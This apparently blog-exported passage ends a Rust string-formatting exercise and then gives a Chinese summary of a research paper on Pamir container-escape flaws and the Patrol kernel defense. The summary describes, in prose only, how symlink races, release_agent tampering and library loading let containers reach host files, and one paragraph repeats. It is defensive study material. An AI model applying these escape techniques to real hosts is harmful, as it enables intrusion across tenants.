来填充二进制，宽度为 10 =&gt; 0b00011011 println!(&quot;Success!&quot;)&#125; 捕获环境中的值9.🌟🌟🌟 1234567891011121314151617181920212223fn get_person() -&gt; String &#123; String::from(&quot;sunface&quot;)&#125;fn get_format() -&gt; (usize, usize) &#123; (4, 1)&#125;fn main() &#123; let person = get_person(); println!(&quot;Hello, &#123;person&#125;!&quot;); let (width, precision) = get_format(); let scores = [(&quot;sunface&quot;, 99.12), (&quot;jack&quot;, 60.34)]; /* 让下面的代码输出: sunface: 99.1 jack: 60.3 */ for (name, score) in scores &#123; println!(&quot;&#123;name&#125;: __&quot;); &#125;&#125; My Answer 1234567891011121314151617181920212223fn get_person() -&gt; String &#123; String::from(&quot;sunface&quot;)&#125;fn get_format() -&gt; (usize, usize) &#123; (4, 1)&#125;fn main() &#123; let person = get_person(); println!(&quot;Hello, &#123;person&#125;!&quot;); let (width, precision) = get_format(); let scores = [(&quot;sunface&quot;, 99.12), (&quot;jack&quot;, 60.34)]; /* 让下面的代码输出: sunface: 99.1 jack: 60.3 */ for (name, score) in scores &#123; println!(&quot;&#123;name&#125;: &#123;score:.1&#125;&quot;); &#125;&#125; Answer 1234567891011121314151617181920212223fn get_person() -&gt; String &#123; String::from(&quot;sunface&quot;)&#125;fn get_format() -&gt; (usize, usize) &#123; (4, 1)&#125;fn main() &#123; let person = get_person(); println!(&quot;Hello, &#123;person&#125;!&quot;); let (width, precision) = get_format(); let scores = [(&quot;sunface&quot;, 99.12), (&quot;jack&quot;, 60.34)]; /* 让下面的代码输出: sunface: 99.1 jack: 60.3 */ for (name, score) in scores &#123; println!(&quot;&#123;name&#125;: &#123;score:.1&#125;&quot;);//或者： println!(&quot;&#123;name&#125;: &#123;score:width$.precision$&#125;&quot;); &#125;&#125; OthersExample 123456789101112fn main() &#123; // 指数 println!(&quot;&#123;:2e&#125;&quot;, 1000000000); // =&gt; 1e9 println!(&quot;&#123;:2E&#125;&quot;, 1000000000); // =&gt; 1E9 // 指针地址 let v= vec![1, 2, 3]; println!(&quot;&#123;:p&#125;&quot;, v.as_ptr()); // =&gt; 0x600002324050 // 转义 println!(&quot;Hello &#123;&#123;&#125;&#125;&quot;); // =&gt; Hello &#123;&#125;&#125;","categories":[{"name":"编程语言","slug":"编程语言","permalink":"http://example.com/categories/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/"},{"name":"Rust","slug":"编程语言/Rust","permalink":"http://example.com/categories/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/Rust/"},{"name":"练习实践","slug":"编程语言/Rust/练习实践","permalink":"http://example.com/categories/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/Rust/%E7%BB%83%E4%B9%A0%E5%AE%9E%E8%B7%B5/"}],"tags":[{"name":"Rust","slug":"Rust","permalink":"http://example.com/tags/Rust/"}]},{"title":"论文阅读 Lost along the Way-Understanding and Mitigating Path-Misresolution Threats to Container Isolation","slug":"论文阅读-Lost-along-the-Way-Understanding-and-Mitigating","date":"2023-09-19T05:03:47.000Z","updated":"2023-09-20T06:18:21.561Z","comments":true,"path":"2023/09/19/论文阅读-Lost-along-the-Way-Understanding-and-Mitigating/","link":"","permalink":"http://example.com/2023/09/19/%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB-Lost-along-the-Way-Understanding-and-Mitigating/","excerpt":"Abstract 人们发现，在容器工具越来越多地利用主机-容器交互的情况下，由当今容器技术强制实施的文件系统隔离效果较差。这种被削弱的隔离导致了一种路径错误解决 path misresolution(Pamir)漏洞，这种漏洞被认为是高风险的，多年来不断有报告。在本文中，我们提出了第一个系统的研究帕米尔风险和现有的修复相关漏洞。我们的研究表明，尽管我们在修补易受攻击的容器工具和解决风险方面做出了重大努力，但帕米尔漏洞仍在继续被发现，包括我们从修补软件中重新发现的一个新漏洞(CVE-2023-0778)。我们研究的一个关键观点是，由于容器工具严重依赖第三方组件，Pamir风险本质上很难在容器工具级别上预防。虽然应该将安全检查应用于所有组件以调解主机容器交互，但第三方组件开发人员倾向于认为容器工具应该在调用其组件之前执行安全检查，因此不愿意用特定于容器的保护来修补他们的代码。此外，由于今天的容器工具所依赖的大量组件，重新实现它们是不切实际的。 我们的研究表明，基于内核的文件系统隔离是确保在主机-容器交互期间始终保持隔离的唯一方法。在我们的研究中，我们设计并实现了第一个这样的方法，将文件系统隔离扩展到dentry对象，通过文件系统对主机-容器交互实施访问控制。我们的设计解决了当前容器单向隔离的基本限制，使用精心设计的策略来确保准确和全面的交互控制，并将保护植入到正确的内核位置以最小化性能影响。我们使用模型检查验证了我们的方法，证明了它在消除帕米尔风险方面的有效性。我们的评估进一步表明，我们的方法产生的开销可以忽略不计，大大优于所有现有的Pamir补丁，并保持与所有主流容器工具的兼容性。我们已经发布了我们的代码，并提交了将我们的技术合并到Linux内核中的请求。","text":"Abstract 人们发现，在容器工具越来越多地利用主机-容器交互的情况下，由当今容器技术强制实施的文件系统隔离效果较差。这种被削弱的隔离导致了一种路径错误解决 path misresolution(Pamir)漏洞，这种漏洞被认为是高风险的，多年来不断有报告。在本文中，我们提出了第一个系统的研究帕米尔风险和现有的修复相关漏洞。我们的研究表明，尽管我们在修补易受攻击的容器工具和解决风险方面做出了重大努力，但帕米尔漏洞仍在继续被发现，包括我们从修补软件中重新发现的一个新漏洞(CVE-2023-0778)。我们研究的一个关键观点是，由于容器工具严重依赖第三方组件，Pamir风险本质上很难在容器工具级别上预防。虽然应该将安全检查应用于所有组件以调解主机容器交互，但第三方组件开发人员倾向于认为容器工具应该在调用其组件之前执行安全检查，因此不愿意用特定于容器的保护来修补他们的代码。此外，由于今天的容器工具所依赖的大量组件，重新实现它们是不切实际的。 我们的研究表明，基于内核的文件系统隔离是确保在主机-容器交互期间始终保持隔离的唯一方法。在我们的研究中，我们设计并实现了第一个这样的方法，将文件系统隔离扩展到dentry对象，通过文件系统对主机-容器交互实施访问控制。我们的设计解决了当前容器单向隔离的基本限制，使用精心设计的策略来确保准确和全面的交互控制，并将保护植入到正确的内核位置以最小化性能影响。我们使用模型检查验证了我们的方法，证明了它在消除帕米尔风险方面的有效性。我们的评估进一步表明，我们的方法产生的开销可以忽略不计，大大优于所有现有的Pamir补丁，并保持与所有主流容器工具的兼容性。我们已经发布了我们的代码，并提交了将我们的技术合并到Linux内核中的请求。 CCS CONCEPTS• Security and privacy → Virtualization and security. KEYWORDScloud native technology, OS-level virtualization, container security Introduction容器技术保证了安全、经济、灵活和高效的软件部署和开发。这些技术将应用程序的代码、数据和依赖关系打包到容器中，容器利用多个内核机制(如名称空间和cgroups)实现应用程序运行时环境(包括文件系统、网络、进程和其他系统资源)与其他应用程序及其主机操作系统(OS)的轻量级隔离。特别的，容器对文件系统的隔离，最流行的容器是使用chroot来防止容器内的进程访问主机。尽管如此，随着CI&#x2F;CD等云原生开发实践的出现，以及它提供的新特性(如复制和卷)，主机-容器交互现在变得必要。 然而，这种交互为安全漏洞提供了新的机会，允许容器化的恶意应用程序打破隔离。更具体地说，这种交互通常是由容器的所有者发起的，目的是将主机资源导入到容器中，或者将容器服务的结果导出回主机。 然而，目前容器和主机之间的文件系统隔离不足以防止由于此类交互的接口而产生的潜在安全违规。事实上，在过去的6年里，一种路径错误解析(又名Pamir)风险一直存在于这些接口上，并且导致了流行容器工具报告的27个高严重性漏洞中的近一半，包括编排平台(例如Kubernetes)、管理引擎(例如Docker和Podman)和运行时(例如containerd和runc)。 可以通过在交互期间操纵路径解析来利用这些漏洞，从而实现从容器的逃逸。更令人担忧的是，这些漏洞继续在所有容器工具中暴露出来。 了解容器工具的帕米尔风险。在我们的研究中，我们对Pamir风险进行了第一次分析，研究了12个引人注目的漏洞，以及由Pamir风险引起的一系列错误，涉及前面提到的五个最突出的容器工具。为了确定这些漏洞的来源以及解决这些漏洞的步骤，我们从这些容器工具中提取并比较了与漏洞相关的多个调用图。每个调用图都是从这些工具的易受攻击版本中绘制的，并根据GitHub问题进行相关修复。此外，我们还手动分析了GitHub上对修复的评论，以了解它们是如何演变的。 通过研究这些漏洞和错误的分布，我们发现每个容器工具的社区多年来一直在努力解决Pamir风险。然而，这个问题似乎很难解决，因为现有的修复程序往往是可以规避的，在某些情况下甚至会引入新的漏洞。特别有趣的是，观察到即使经过多次迭代，当安全修复已经改进到给定容器工具的Pamir风险确实可以解决的水平时，升级工具的新功能也会忽略修复并使工具再次暴露于相同的风险，正如我们在Podman中发现的一个新漏洞(CVE-2023-0778)所证明的那样，其Pamir漏洞之前已经被修补过。 我们研究的一个关键观点是，帕米尔风险在主机应用程序(如容器工具)层面基本上很难预防，因为它们严重依赖第三方组件(库、第三方可执行文件、操作系统接口等)。 这个问题来自于当今容器内文件系统的单向隔离:当文件系统之外的资源超出容器的名称空间，因此对容器化的应用程序不可见时，主机可执行文件(包括容器工具和它所依赖的组件)在访问容器内文件系统时不会看到任何约束。因此，对主机容器交互的任何安全控制都需要对主机可执行文件及其组件执行的所有与文件系统相关的操作实施。 当涉及到容器工具使用的第三方组件时，这变得很困难:例如，Kubernetes需要Linux挂载工具来实现卷特性。使这种保护策略几乎不可能实现的原因是，这些组件的开发人员根本没有实现这种特定于容器的控制的动机，而是认为在调用其依赖的组件之前应该由容器工具执行安全检查。 为了摆脱这种困境，当今容器工具的开发人员提出了各种特别的解决方案，以避免第三方组件的危险行为，例如在交互之前为组件预加载受信任的动态链接库。然而，这些补丁会带来显著的性能负担:例如，修复’ docker cp ‘上的Pamir风险的开销可以达到200%(第6节)。更严重的是，这些补丁是脆弱的，可以通过对组件或其供应链的任何更新来规避甚至完全禁用。一个例子是前面提到的对Docker漏洞CVE-2019-14271的修复，该漏洞在更新glibc时不再有效，该更新允许在上下文切换期间自动重新加载预加载的库。作为最后的手段，一些容器工具的开发人员被迫部分地重新实现不兼容组件的替换。我们的分析表明，这将需要相当大的工程努力，因为每个容器工具的脆弱特征平均与超过1,090个Golang包相关。随着更多的功能被添加到容器工具中，更多的第三方组件变得不可避免，使得这种重新实现变得越来越困难。 我们的解决方案。我们对已知Pamir漏洞的系统分析表明，容器工具无法在用户层面有效控制此安全风险。因此，基于内核的文件系统隔离成为唯一可行的解决方案，可以全面协调来自不同类型第三方组件的文件系统访问，从而确保在主机-容器交互期间始终保持隔离。然而，由于当前的文件系统隔离设计，这种努力不是微不足道的，它甚至对内核也是透明的。更具体地说，为了最小化中介访问文件系统的开销，当前的设计只是隔离容器和主机之间的挂载点，将容器应用程序的操作限制在其名称空间内。因此，从虚拟文件系统(VFS)中，内核无法判断目录条目(dentry)对象是否属于容器。这使得对文件系统的任何非法访问都难以识别，只要访问请求的路径可以通过VFS转换为dentry对象。此外，即使给定了访问目标信息(无论是否为容器)，设计准确、全面的访问控制策略仍然具有挑战性:例如，虽然容器工具应该被允许访问容器外部的对象，这个访问请求不应该由容器内部的应用程序引起(第3.2节)。最后，还需要仔细考虑策略的实施，以避免对系统性能产生任何重大影响，并确保访问的完全中介。 在我们的研究中，我们设计并实现了针对帕米尔风险的第一个内核端防御。我们的方法，称为Patrol (Pamir control)，将文件系统隔离扩展到dentry对象，确保主机-容器文件系统相关交互的完全中介。 为此，Patrol根据dentry与容器的关系对它们进行标记，并使用一组精心设计的策略来规范对这些对象的访问。此外，我们还分析了将用户空间路径转换为VFS中的dentry对象的过程，在路径查找函数中确定执行策略的最佳位置，从而确保对主机-容器交互的完整和有效控制。 我们通过模型检查验证了Patrol的设计，表明它能够完全消除帕米尔风险。我们进一步评估了我们在Docker、Podman和Kubernetes上的实现。我们的研究表明，Patrol在易受攻击的容器工具上的性能大大优于所有用户修复，并且平均只产生不到4%的开销。此外，Patrol与所有主流容器工具完全兼容，并且是完全透明的:它不会影响容器工具、它们所依赖的组件和其他应用程序的操作。我们已经发布了我们的代码，并提交了将我们的技术合并到Linux内核中的请求。 本文的贡献概述如下: 调查结果和结论。我们对高影响的Pamir风险进行了第一次系统研究，并证明了这种风险从根本上是由容器和主机之间的文件系统隔离不足造成的，目前的保护无法解决这个问题。作为当今解决方案局限性的证据，我们发现并报告了容器工具中以前已经修补过的新的Pamir漏洞。 新的防御技术。我们设计了一种新的隔离技术，并有效而全面地解决了在内核内部实现的技术难题。我们的方法已经通过模型检查和主流容器工具的评估得到了验证，证明了新的解决方案比目前提出的任何替代方案都更有效，而且更实用，对性能的影响非常低。 BackgroundVirtual Filesystem “一切都是文件”是Linux的基本理念之一。不仅普通文件，包括目录、字符设备、块设备、套接字等，都可以被视为文件。这种设计的基础是Linux的虚拟文件系统(VFS)机制。它为用户程序操作文件提供了统一的接口层，屏蔽了不同文件系统的差异和操作细节。 Dentry and Dentry tree. Dentry是一种数据结构，表示内核中的文件或目录对象。dentry包含相应文件或目录的名称，可以直接映射文件和目录之间的层次关系。每个dentry都包含指向其父dentry的指针和其子dentry的列表，这使得dentry形成了一个dentry树。VFS使用dentry树来维护文件和目录对象的层次结构。当然，对于大型系统，不可能将文件系统的所有条目都放入内存中。所以树中的这些dentry是引用计数的。Dentry缓存(Dcache)只维护被引用的Dentry，并从Dentry树中删除未引用的Dentry以释放内存。 Filesystem mounting Linux内核构造挂载树来维护系统中的挂载信息。如图1所示，挂载树的叶子是一个名为“mount”的数据结构。mount结构包含指向新文件系统挂载的挂载点dentry的指针，以及指向新文件系统根目录dentry的指针。挂载点的dentry和新文件系统的根目录没有直接的父子关系，但是mount结构充当了连接具有挂载关系的文件系统dentry的桥梁。 Path lookup VFS中最常见的操作是路径查找。内核使用路径查找将路径名从userland转换为内核中相应的dentry对象。通常，对于每个与文件系统相关的系统调用(如open、read、write、stat、mount等)，解析pathname的路径查找是必要的。具体来说，路径查找是遍历路径名并找到路径名中最终组件对应的dentry(我们称之为最终dentry)，其中组件是由’ &#x2F; ‘字符分隔的子字符串。每个查找过程创建一个nameidata对象来存储其中间结果(例如，组件的dentries)。在路径查找开始时，使用该查找过程的起始点初始化nameidata对象中的第一个组件的dentry，该起始点由路径名的第一个字符确定。如果路径名以’ &#x2F; ‘字符开头，则起点是调用进程根目录的dentry。否则，它是进程当前工作目录的dentry。然后，在前一个组件dentry的子组件中查找路径名的每个组件。 这是通过比较组件的名称与存储在dentry中的名称来完成的。发现的dentry通过内核函数path_to_nameidata保存到nameidata对象中。如果找不到组件的dentry，则路径查找过程将以失败告终。无论路径查找是否成功，在查找过程结束时都会调用内核函数complete_walk来完成路径查找并返回状态码。 在查找过程中，如果一个dentry表示一个符号链接(也就是sym_link)，内核函数trailing_symlink来跟踪此符号链接并提取指向的路径名。 然后，该路径名替换符号链接以继续路径查找过程。如果一个dentry作为挂载点，那么查找过程将遵循挂载树中相应的“mount”结构来定位表示挂载文件系统根目录的dentry，并继续从该dentry查找组件。 通常，起点和挂载点是决定路径查找结果的两个关键元素。如果进程通过这样的系统调用chroot到达不同的根目录，则更改的查找起始点将把相同的路径名引导到不同的根目录。此外，如果进程将一个新的挂载名称空间与一个孤立的挂载树连接起来，那么路径查找也会得到区别，因为不同的挂载名称空间可能在同一挂载点下呈现不同的挂载视图。 Container Filesystem IsolationLinux内核同时利用名称空间和类似chroot的功能来隔离容器文件系统。Linux命名空间强制进程级资源隔离。特别是，使用挂载名称空间，可以为每个名称空间创建一个独立的文件系统挂载层次结构。这确保了在每个挂载名称空间中运行的进程都有自己独立的挂载点视图。 此外，类似chroot的功能可以为进程指定一个新的根目录，限制它们在这个新根目录中可以访问的资源。挂载点的独立视图防止进程访问挂载在其他挂载名称空间中的文件系统，而chroot强制进程只能访问给定目录中的资源。因此，该进程与未经授权的资源完全隔离。 具体来说，创建和隔离容器文件系统的过程如图1所示。最初，容器工具从容器映像中提取rootfs并将其挂载到给定主机的目录(①)上，例如“&#x2F;var&#x2F;lib&#x2F;docker&#x2F;[storage driver]&#x2F;[ID:sha256]&#x2F;”。 然后，容器工具调用带有CLONE_NEWNS标志的系统调用克隆，以创建容器的初始进程。这将与该进程一起生成一个新的挂载名称空间，并且容器内的所有进程都加入该名称空间(②)。通常，从调用进程的挂载名称空间克隆一个新的挂载名称空间，这将导致容器的挂载名称空间继承主机的挂载树。只有在这些名称空间中添加的新挂载对其他名称空间是不可见的。 在这种情况下，容器进程仍然可以遍历主机的文件系统。因此，使用类似chroot的系统调用pivot_root来用容器的rootfs(③)重置这些进程的根目录，以确保进程只能访问rootfs下的文件和目录，包括挂载点。尽管如此，这种隔离仍然是不完整的，许多漏洞可以绕过它。 INCOMPLETE FILESYSTEM ISOLATION尽管每个容器都有一个独立于主机的文件系统视图，但是它们的文件系统之间的隔离并没有完全完成。在本节中，我们首先澄清威胁模型，然后讨论容器隔离中的Pamir漏洞(bug问题&#x2F; cve)。最后，我们将展示我们从当前针对此类漏洞的行业解决方案中获得的度量和理解。 Threat Model我们考虑由容器工具(例如Docker和Kubernetes)管理的基于容器的平台，在这些平台上运行的多租户容器可以共享相同的操作系统。容器工具和平台上的操作系统是可信的，但容易受到攻击。基于容器的平台中的攻击者可以控制多个容器，并试图破坏操作系统或其他租户的容器。而且，攻击者有能力操纵容器中的所有资源，比如文件系统和进程。此外，他们还可以利用合法的接口来提示平台与这些资源进行交互，以便进行越狱。这些合法接口封装了容器工具的功能，如复制、运行和卷。这也是所有其他容器逃逸场景中的典型威胁模型。 Pamir Vulnerabilities在主机-容器交互期间，各种容器工具从主机上下文访问容器文件系统。然而，容器在这些工具眼中被认为是不可信的，并且可能欺骗它们访问其文件系统中的恶意有效负载。由于路径错误解析(Pamir)而出现的漏洞反复暴露在这些属性中，并对所有广泛使用的容器工具产生影响，尽管它们是由不同的社区开发的(参见图2)。这些漏洞主要通过两种方式被利用来破坏主机，从而实现信息泄露、特权升级、任意文件操作和其他相关安全问题。 符号链接解析欺骗是利用Pamir漏洞的方法之一。通常，在主机-容器交互期间，容器工具可以访问容器文件系统中的符号链接，对其进行读或写操作。但是，这个符号链接是在主机上下文中解析的，而不是在容器上下文中解析的。恶意容器中的复杂符号链接可以欺骗容器工具导航到容器文件系统之外，并访问主机上的敏感位置(例如’ &#x2F;etc&#x2F;passwd ‘)。 恶意容器可以利用具有Pamir漏洞的“卷”特性来遍历主机上的任意文件。“volume”特性用于将卷挂载到容器文件系统中，它可以是主机的目录，以提供持久存储。此外，Kubernetes中的“subPath”属性允许将一个容器使用的卷中的子目录挂载到其他容器中。但是，如果该子目录被恶意容器替换为符号链接，则该符号链接所引用的主机上的任意目录将被挂载到另一个恶意容器中，从而导致Kubernetes“volume”特性中最早的漏洞CVE-2017-1002101。 虽然Kubernetes已经纠正了这个问题，但类似的攻击面仍然存在于它的依赖组件中，导致类似的漏洞，如CVE-2022-23648和CVE-2021-30465分别在containd和runc中存在。C版本的runc也有相同的漏洞。 类似的漏洞也存在于“复制”功能中，并允许遍历主机上的文件以及覆盖任何主机的文件。“复制”特性是由容器工具实现的，用于在容器和主机之间复制文件。但是，无论是从容器复制还是向容器复制，无论是源容器还是目标容器都受不信任的容器控制。具体来说，如果恶意符号链接取代了从容器复制的文件，则复制源可能通过该符号链接被带出容器。类似地，替代容器中复制目标的恶意符号链接可能会误导文件被复制到主机上的任意目录，而不是该容器。类似的漏洞CVE-2019-10152和CVE-2019-18466也出现在Podman中，尽管Podman的开发人员受到CVE-2018-15664[30]的启发，努力避免这类漏洞。此外，我们还在Podman的“export volume”功能中发现了一个漏洞CVE-2023-0778，该漏洞遵循相同的原理。 不受信任的容器控制。具体来说，如果恶意符号链接取代了从容器复制的文件，则复制源可能通过该符号链接被带出容器。类似地，替代容器中复制目标的恶意符号链接可能会误导文件被复制到主机上的任意目录，而不是该容器。类似的漏洞CVE-2019-10152和CVE-2019-18466也出现在Podman中，尽管Podman的开发人员受到CVE-2018-15664的启发，努力避免这类漏洞。此外，我们还在Podman的“export volume”功能中发现了一个漏洞CVE-2023-0778，该漏洞遵循相同的原理。 诱导非法文件执行是利用Pamir漏洞的另一种方法。除了可以读写之外，容器中的文件还可以在主机-容器交互期间由主机的进程(例如容器工具)执行。但是，此执行可能会导致容器中的恶意有效负载在主机上下文中起作用。 尽管所有容器工具都努力避免这种执行，但许多不可预见的执行仍然隐藏在它们的特性中。 例如，Docker不知道它会在容器中加载一个动态链接的库’ nsswitch ‘ 。 具体来说，这个库是由一个Golang包所需要和加载的，Docker调用这个包来捆绑复制的文件，但是这个包没有意识到这个加载是在调用系统调用chroot之后发生的。使用sycall chroot是修复漏洞CVE-2018-15664的方法，该漏洞限制了容器内的符号链接解析。然而，通过这种方式，库’ nsswitch ‘也被迫在容器文件系统中解析。但该进程仍然属于主机，从而导致新的漏洞CVE-2019-14271。类似地，Podman中的CVE-2022-1227漏洞源于通过主机上下文中的“Podman top”功能调用容器中的“nsenter”可执行文件。 此外，值得注意的是，在主机上运行的系统进程不能避免执行来自不受信任容器的篡改文件。这类文件由Cgroupfs提供，作为主机和容器之间共享cgroups信息的交互接口。其中，Cgroupfs中的一个特殊文件’ release_agent ‘将在容器终止后由主机系统进程执行。 CVE-2022-0492漏洞是该文件被恶意容器破坏的直接结果。通常，容器只能从自己的文件系统中的’ &#x2F;sys&#x2F;fs&#x2F;cgroup ‘访问’ release_agent ‘文件;但是，安全性配置不足的容器可以绕过权限检查并更改此文件。这允许在主机系统上执行’ release_agent ‘文件中的任何恶意负载。 Understanding Fixing Methods尽管主流容器工具社区进行了许多尝试来解决Pamir漏洞，但它们仍然存在。为了确定这些尝试修复的缺点，我们使用go-callvis开源工具从前面提到的容器工具的脆弱版本和更新版本中提取调用图。通过手工分析相关的调用图和仔细检查GitHub上的所有相关评论，我们能够全面了解这些修复的演变 观察1 -容器工具的第三方组件阻碍了漏洞的彻底修复 修复容器工具中的漏洞可能无法消除其依赖组件中的攻击面，这会带来严重的风险。 为了应对符号链接解析作弊，开发了一个新的包’ secureJoin ‘来取代Golang包’ filepath ‘，目的是通过验证符号链接是否被解析到指定目录(例如，容器的根目录)来实现安全的路径解析。然而，尽管在工程上做出了重大努力来实现这一修复，但作弊的固有风险并未完全消除。这是由于分辨率检查过程和随后的路径相关操作(例如复制或挂载)之间存在竞争条件，这可以通过TOCTTOU攻击来利用恶意符号链接替换已验证的路径。 具体来说，这种替换是在主机上的容器工具完成解析检查后，攻击者在容器内执行的。这导致各种容器工具中存在一系列漏洞，例如CVE-2018-15664、CVE-2021-30465、CVE-2021-25741、CVE-2022-23648和CVE-2023-0778。 尽管人们尝试修复容器工具中的漏洞，但它们仍然很容易受到攻击。例如，Podman社区选择在容器的文件系统被Podman访问时暂停容器，因为冻结的容器无法进行竞争。然而，这个修复带来了巨大的开销(参见第6节)，并且已经确定了一个可以绕过它的弱点。 具体来说，如果两个容器共享一个卷，那么当Podman与冻结的容器交互时，一个容器仍然可以访问卷并进行TOCTTOU攻击。 此外，Kubernetes、containard和runc社区试图通过原子化解析检查和随后的路径相关操作来消除竞争条件。但是，这些后续操作调用的任何第三方可执行文件都可能破坏这种原子化。具体地说，这种原子化是通过用“&#x2F;proc&#x2F;[pid]&#x2F;fd&#x2F;[fd]”这个魔术链接替换选中的路径来实现的，以供后续操作使用。这个神奇的链接总是指向被检查的路径，但是在Kubernetes的’ volume ‘特性中，解析检查后调用的Linux挂载工具默认会解析这个神奇的链接，并使用解析结果在最后调用sycall挂载。这导致了漏洞CVE-2021-25741，该漏洞只能通过调用带有-no-canonicalize标志的挂载工具来禁用解析来修复。 Docker社区的修复旨在消除其“复制”特性中的符号链接解析欺骗，但由于第三方包的不可控行为而导致非法执行问题。 ‘copy ‘特性中的修复使用系统调用chroot在访问容器的路径之前进入容器文件系统，确保此路径中的任何符号链接总是在容器中解析。 然而，被’ copy ‘功能调用的第三方包可能没有意识到chroot会将它们带入不受信任的环境，例如，CVE-2019-14271是由’ nsswitch ‘库意外加载到容器中引起的(参见3.2节)。社区通过在复制开始时加载所有动态库临时修复了此漏洞。GNU C库(glibc)的更新(它对任何容器工具都是透明的)可能会使此修复无效。此更新使glibc库，包括’ nsswitch ‘，在chroot触发上下文切换后自动重新加载。 观察2 -操作系统接口相关的漏洞很难被容器工具彻底修复 容器工具无法消除与伪文件系统相关的此类漏洞。 考虑到漏洞CVE-2019-5736，修复只能阻止攻击后果，而不能消除Procfs中的攻击面。具体地说，此修复旨在生成runc可执行文件的副本，以执行每个主机-容器交互。即使CVE-2019-5736漏洞可以被成功利用，也只是覆盖副本而不是原始副本。此外，Cgroupfs接口相关的漏洞CVE-2022-0492也无法通过容器工具消除。他们的解决方案只是减少容器的特权(即禁用特权用户名空间)，以避免容器修改“release_agent”，但这会影响运行容器的能力。最后，内核补丁对易受攻击的接口实施访问控制，彻底修复了这个漏洞。 Insight用户域中的修复受到容器工具中的第三方组件的阻碍，这些组件无法消除无处不在的Pamir风险的根本原因。从根本上说，帕米尔风险源于不完整的基于内核的隔离。改进这种文件系统隔离是解决这个问题的最佳方案。 洞察1 -在用户区修复是无效和不切实际的根除帕米尔风险。 关于Pamir风险，对容器工具的全面检查只能处理容器工具本身的攻击面，而不能处理其相关组件。例如，Kubernetes社区增加了大约3700行代码来执行路径解析检查，这只会减轻CVE-2017-1002101漏洞，同时在其相关组件中暴露相同的攻击面。CVE-2021-30465和CVE-2021-25741等漏洞可以绕过这些检查。容器工具使用特别的解决方案来规避第三方组件中的危险行为，但是这些解决方案很脆弱，很难进行周密的设计。例如，CVE-2019-14271的修复(在3.3节中讨论)是一个临时解决方案。 为此，开发人员倾向于在相关组件中添加安全检查，但这样的建议通常不被接受。由容器工具社区开发的包’ secureJoin ‘是Golang包’ filepath ‘的扩展，它将路径解析检查添加到包’ filepath ‘(在第3.3节中提到)。然而，Golang社区拒绝将这个包合并到它的标准库中。社区认为这个包只是为容器工具量身定制的，而不是一个可以在其他地方使用的通用功能。 此外，Golang社区认为，容器工具在调用其库之前应该进行安全检查，并且不认为这是任何Golang库的责任。 第三方组件请求容器工具负责安全检查，但这些检查并不能消除其中潜在的攻击面，这是一个悖论。重新实现有风险的第三方组件可能成为解决Pamir风险的最后一种方法，但它需要大量的工程努力，并且可能不符合软件工程中的最佳实践。例如，Podman社区修改了40,836行代码来部分实现Podman中的Linux实用程序’ nsenter ‘，仅仅是为了解决’ Podman top ‘功能中的CVE-20221227。此外，还有7,498行代码修改来实现’ docker cp ‘功能中的第三方包’ archive&#x2F;tar ‘的分割功能，在临时修复不再有效后，已弃用该功能以避免CVE-2019-14271。 实际上，我们对容器工具调用的第三方包的分析强调了重新实现这些组件的不合理性和不可持续性。具体来说，我们利用Golang内置的包管理工具来识别易受攻击特性调用的包，并递归查询网站pkg.go.dev[18]来追踪这些包的供应链。结果表明，目前，超过5,458个Golang包与容器工具相关(我们的网站提供了更多信息)。随着容器工具纳入更多需要管理的第三方组件，数量将不可避免地增加。 洞察2 -应该增强容器和主机之间基于内核的文件系统隔离，以消除无穷无尽的Pamir漏洞。 容器和主机之间不完全的基于内核的文件系统隔离是持续存在的Pamir漏洞的根本原因。mount名称空间和pivot_root提供了一定程度的隔离，但它们并不能完全覆盖所有VFS对象，比如dentry，这使得内核在解析了用户空间路径后很难区分dentry对象是否属于容器。这种不完全隔离意味着主机上的进程无法区分容器的文件系统，如果安全检查不限制该进程，则可能将其视为受信任的环境。此外，不完全隔离不会阻止容器的进程通过非法通道(如’ &#x2F;proc&#x2F;self&#x2F;exe ‘)访问主机的文件系统(如漏洞CVE-2019-5736所示)。因此，增强容器和主机之间基于内核的文件系统隔离对于消除Pamir风险至关重要。 总之，我们认为Pamir风险的根本原因在于内核中不完整的文件系统隔离。因此，为了完全而优雅地消除风险，我们必须重构内核的文件系统隔离机制。具体来说，我们需要将文件系统隔离扩展到VFS中的dentry对象，并确定每个dentry是属于容器文件系统还是属于主机。然后，这种扩展的隔离机制可以基于进程和dentry属性强制执行访问控制策略，以防止容器和主机之间的非法访问。通过实现这些措施，我们可以解决导致Pamir风险的潜在问题，并提高容器环境的整体安全性。 PATROL本文提出了一种名为PAth misresolution conTROL (PATROL)的容器文件系统隔离机制，该机制可以限制行为，防御Pamir攻击。在本节中，我们将详细介绍Patrol的设计，以及它如何以系统的方式消除与文件系统相关的容器逃逸问题。 Guidelines为了有效地增强容器文件系统的隔离性，需要加强挂载名称空间，并加快我们的原型的合并。在实际应用中，我们希望设计能够满足以下要求。 完整的保护。要永久解决容器转义中与文件系统相关的漏洞，Patrol必须能够隔离恶意符号链接解析，并对跨名称空间文件访问执行完整的权限检查。 完整的兼容性。我们希望为用户应用程序提供透明的保护，这样就不会对容器工具进行任何修改，也不会对容器内运行的用户空间应用程序进行任何修改。并且Patrol与所有系统调用接口应该没有兼容性问题。 最小的性能损失。在无服务器计算或功能即服务的背景下，云服务提供商和用户都期望快速部署无服务器功能。此外，预计任何运行时检查都不会显著损害性能。因此，我们的安全增强内核的实现既简单又优雅，同时保持与本机Linux相当的性能。 Overview 我们的总体目标是保持系统平稳运行，同时尽可能地隔离容器和主机文件系统。 在Patrol的设计背后，主要思想是增强基于内核的容器文件系统隔离。 图3说明了与我们扩展的文件系统隔离相关的新设计。通过在每个容器内的dentry上放置标记，Patrol将隔离扩展到VFS对象。我们称这个过程为“渲染”。应该注意的是，主机进程也可以通过容器的文件系统并访问主机的dentry(在3.2节中提到)，因此开始时的静态呈现是不够的。因此，Patrol还执行动态路径查找呈现，并在路径解析期间调节对这些dentry的访问。通过将呈现过程和访问控制集成到Linux路径查找例程中，我们使隔离成为一个完整的部分。这样做的好处是，在构建过程中，Patrol可以非常轻量级和紧凑，尽可能减少冗余代码，并将性能开销降至最低。 区分容器和主机之间的dentries。 在容器初始化期间，我们需要识别VFS中容器文件系统的dentry对象，并区分容器文件系统和主机文件系统中的对象。这种识别对于为以后的访问控制建立基础至关重要。呈现是指示条目所属范围的有效方法。 